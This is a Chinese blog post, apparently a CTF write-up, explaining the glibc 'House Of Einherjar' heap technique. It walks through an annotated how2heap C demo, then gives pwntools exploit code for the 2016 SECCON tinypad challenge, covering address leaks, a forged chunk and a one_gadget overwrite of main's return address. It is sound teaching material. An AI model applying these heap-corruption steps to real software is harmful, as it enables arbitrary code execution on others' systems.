@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>House Of Einherjar | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="House Of Einherjar 原理用 how2heap 的例子看一下参考：http:&#x2F;&#x2F;blog.topsec.com.cn&#x2F;pwn 的艺术浅谈（二）：linux 堆相关&#x2F; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Einherjar">
+<meta property="og:url" content="https://yichen115.github.io/2020/09/08/hwrtn9/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="House Of Einherjar 原理用 how2heap 的例子看一下参考：http:&#x2F;&#x2F;blog.topsec.com.cn&#x2F;pwn 的艺术浅谈（二）：linux 堆相关&#x2F; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599743961938-b807d17f-22a1-4c4b-9940-591d80bff78c.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=272&originWidth=778&size=45616&status=done&style=none&width=571">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599748630595-d2dd3efb-4027-41c5-ae8e-4a4d790d08ad.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=256&originWidth=779&size=46934&status=done&style=none&width=599">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599805157537-de1c47db-ef0d-4b13-97f3-0357e121d18f.png#align=left&display=inline&height=273&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=781&size=32050&status=done&style=none&width=529">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599806234094-38daddc4-26ab-47d9-a985-a3d9bc1d90e9.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=170&originWidth=799&size=40555&status=done&style=none&width=634">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599808679596-b176af25-3096-4d1c-9c51-e048ca9f5064.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=779&size=58207&status=done&style=none&width=645">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599907207630-32fddaca-a7e8-4304-9fa0-763b36ce6ed3.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=322&originWidth=788&size=65378&status=done&style=none&width=610">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599921103214-8f9756ab-c286-4262-a7be-6c4cb9296b3e.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&name=image.png&originHeight=239&originWidth=787&size=47269&status=done&style=none&width=612">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599959815752-3975e9c2-b4c3-40bf-b2f5-2f98c171cd77.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=600&size=65758&status=done&style=none&width=492">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599975425284-ce4533f5-6374-441c-a3d2-b6405d3163c0.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=603&size=88575&status=done&style=none&width=493">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599980540990-da334df6-9e0b-46b4-b845-695679346ab5.png#align=left&display=inline&height=482&margin=%5Bobject%20Object%5D&name=image.png&originHeight=769&originWidth=807&size=161024&status=done&style=none&width=506">
+<meta property="article:published_time" content="2020-09-08T02:43:49.000Z">
+<meta property="article:modified_time" content="2020-09-16T08:07:09.195Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599743961938-b807d17f-22a1-4c4b-9940-591d80bff78c.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=272&originWidth=778&size=45616&status=done&style=none&width=571">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">House Of Einherjar</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">House Of Einherjar</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-09-08T02:43:49.000Z" itemprop="datePublished" class="page-time">
+  2020-09-08
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#House-Of-Einherjar-原理"><span class="post-toc-number">1.</span> <span class="post-toc-text">House Of Einherjar 原理</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2016-Seccon-tinypad"><span class="post-toc-number">2.</span> <span class="post-toc-text">2016 Seccon tinypad</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-hwrtn9"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">House Of Einherjar</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-09-08 10:43:49" datetime="2020-09-08T02:43:49.000Z"  itemprop="datePublished">2020-09-08</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="House-Of-Einherjar-原理"><a href="#House-Of-Einherjar-原理" class="headerlink" title="House Of Einherjar 原理"></a>House Of Einherjar 原理</h1><p>用 how2heap 的例子看一下<br>参考：<a href="http://blog.topsec.com.cn/pwn的艺术浅谈（二）：linux堆相关/" target="_blank" rel="noopener">http://blog.topsec.com.cn/pwn 的艺术浅谈（二）：linux 堆相关/</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* a;</span><br><span class="line">    <span class="keyword">uint8_t</span>* b;</span><br><span class="line">    <span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n申请 0x38 作为 chunk a\n"</span>);</span><br><span class="line">    a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk a 在: %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc_usable_size()可以返回指针所指向的 chunk 不包含头部的大小，chunk a 的 size: %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n接下来在栈上伪造 chunk，并且设置 fd、bk、fd_nextsize、bk_nextsize 来绕过 unlink 的检查\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size 必须要等于 fake_chunk 的 size 才能绕过 P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size 只要能够整理到 small bin 中就可以了</span></span><br><span class="line">    fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fd</span></span><br><span class="line">    fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bk</span></span><br><span class="line">    fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fd_nextsize</span></span><br><span class="line">    fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bk_nextsize</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们伪造的 fake chunk 在 %p\n"</span>, fake_chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd: %#lx\n"</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bk: %#lx\n"</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fd_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bk_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">    b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n再去申请 0xf8 chunk b.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk b 在: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nb 的 size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b 的 大小是: 0x100，prev_inuse 有个 1，所以显示 0x101\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"假设有个 off by null 的漏洞，可以通过编辑 a 的时候把 b 的 prev_inuse 改成 0\n"</span>);</span><br><span class="line">    a[real_a_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b 现在的 size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n我们伪造一个 prev_size 写到 a 的最后 %lu 个字节，以便 chunk b 与我们的 fake chunk 的合并\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n我们伪造的 prev_size 将会是 chunk b 的带 chunk 头的地址 %p - fake_chunk 的地址 %p = %#lx\n"</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n接下来要把 fake chunk 的 size 改掉，来通过 size(P) == prev_size(next_chunk(P)) 检查\n"</span>);</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nfree b，首先会跟 top chunk 合并，然后因为 b 的 prev_size 是 0，所以会跟前面的 fake chunk 合并，glibc 寻找空闲块的方法是 chunk_at_offset(p, -((long) prevsize))，这样算的话 b+fake_prev_size 得到 fake chunk 的地址，然后合并到 top chunk，新的 topchunk 的起点就是 fake chunk，再次申请就会从 top chunk 那里申请\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"现在 fake chunk 的 size 是 %#lx (b.size + fake_prev_size)\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n现在如果去 malloc，他就会申请到伪造的那个 chunk\n"</span>);</span><br><span class="line">    d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x200) 在 %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面文字基本表达完了，但还是调试着看一下叭</p>
+<p>首先申请了一个 chunk a，然后在栈上伪造了一个 chunk，为了绕过 unlink 的检查，先把 fd、bk、fd_nextsize、bk_nextsize 直接写成我们 fake_chunk 的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599743961938-b807d17f-22a1-4c4b-9940-591d80bff78c.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=272&originWidth=778&size=45616&status=done&style=none&width=571" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后申请一个 chunk b，因为前面申请的 chunk 的大小是 0x38，所以 chunk a 共用了 chunk b 的 chunk 头的 0x8，也就是说我们写 chunk a 的最后 0x8 字节可以直接更改掉 chunk b 的 prev_size，这里为了让他能找到我们的 fake chunk，所以用 chunk b 的地址减去 fake chunk 的地址，0x603040-0x7fffffffdca0=0xffff8000006053a0</p>
+<p>同时假设存在一个 off by null 的漏洞，可以更改掉 chunk b 的 prev_inuse 为 0</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599748630595-d2dd3efb-4027-41c5-ae8e-4a4d790d08ad.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=256&originWidth=779&size=46934&status=done&style=none&width=599" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后我们释放掉 b，这时候 b 因为与 top chunk 挨着，会跟 top chunk 合并，然后因为 prev_inuse 是 0，所以会根据 prev_size 去找前面的 free chunk，然而 prev_size 被我们改了，他去找的时候找到的是 fake chunk，然后两个合并，新的 top chunk 起点就成了 fake chunk，再次分配的时候就会分配到 fake chunk 那里了<br>ps.按照这个道理 <code>d = malloc(0x200)</code> 这行代码还没执行的时候，<code>p main_arena</code> 应该看到 top 被改成了 fake chunk 地址的，但是调试的时候显示的是 chunk b 的地址，然而 malloc 之后才显示 top 为 fake chunk 的地址，然而此时 d 的地址已经是在 fake chunk 那里了，不知道为啥</p>
+<p>再深入理解为啥会跟 top chunk 合并之类这些问题大概要把 libc 的源码看一下才能理解，等以后吧 Orz</p>
+<h1 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h1><p>参考：<a href="https://xz.aliyun.com/t/6556" target="_blank" rel="noopener">https://xz.aliyun.com/t/6556</a><br>在 read 的时候有一个 off by null</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599805157537-de1c47db-ef0d-4b13-97f3-0357e121d18f.png#align=left&display=inline&height=273&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=781&size=32050&status=done&style=none&width=529" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>程序在 0x602140 这里记录了申请的 chunk 的 size 与指针</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599806234094-38daddc4-26ab-47d9-a985-a3d9bc1d90e9.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=170&originWidth=799&size=40555&status=done&style=none&width=634" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>首先需要泄漏 libc 的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x80</span>, <span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'d'</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap_addr = u64(p.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_arena_addr = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">libc_base = main_arena_addr - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="comment">#0x3c4b20用main_arena工具计算出来的,也可以vmmap看一下libc基址自己算</span></span><br><span class="line"><span class="comment">#把剩下那俩也free掉</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先申请几个，然后释放掉两个，用来获取 unsorted bin 的地址和 heap 的地址（chunk3 的 fd 指针）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599808679596-b176af25-3096-4d1c-9c51-e048ca9f5064.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=779&size=58207&status=done&style=none&width=645" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tinypad = <span class="number">0x0602040</span></span><br><span class="line">offset = heap_addr + <span class="number">0x20</span> - (tinypad + <span class="number">0x20</span>)</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这一块首先是通过计算算出了 heap_addr + 0x20 与 tinypd+0x20 的地址的偏移（实际上是 heap_addr 与 tinypad 的偏移），然后伪造了一个 fake chunk，它的大小是 0x101，fd 跟 bk 都是 tinypad + 0x20 的地址值<br>然后通过 edit(2) 来吧内容写到 0x0602040 这里，此时在 0x602060 处就是我们的 fake chunk<br>（edit 的时候先写到 0x0602040 这里，然后复制到指定的位置。真的，大部分问题可能都出在看不懂程序上 Orz）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599907207630-32fddaca-a7e8-4304-9fa0-763b36ce6ed3.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=322&originWidth=788&size=65378&status=done&style=none&width=610" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>对 chunk1 先 free 然后申请回来，同时把 offset 写到 chunk2 的 prev_size 位上，加上程序的 off by null 的漏洞，可以把 chunk2 的 prev_inuse 位给改为 0，所以再去 free chunk2 的时候就成功利用了 House Of Einherjar</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599921103214-8f9756ab-c286-4262-a7be-6c4cb9296b3e.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&name=image.png&originHeight=239&originWidth=787&size=47269&status=done&style=none&width=612" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena_addr + <span class="number">88</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>同时利用 edit(4) 把 fake chunk 的 fd、bk 给改成 main_arena+88 的地址（unsorted bin）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599959815752-3975e9c2-b4c3-40bf-b2f5-2f98c171cd77.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=600&size=65758&status=done&style=none&width=492" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0x45226</span></span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line">create(<span class="number">0xf0</span>, <span class="string">'6'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line">p.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_addr = u64(p.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">main_ret = leak_addr - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">p.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">p.success(<span class="string">"leak_addr: %x"</span> % leak_addr)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure>
+
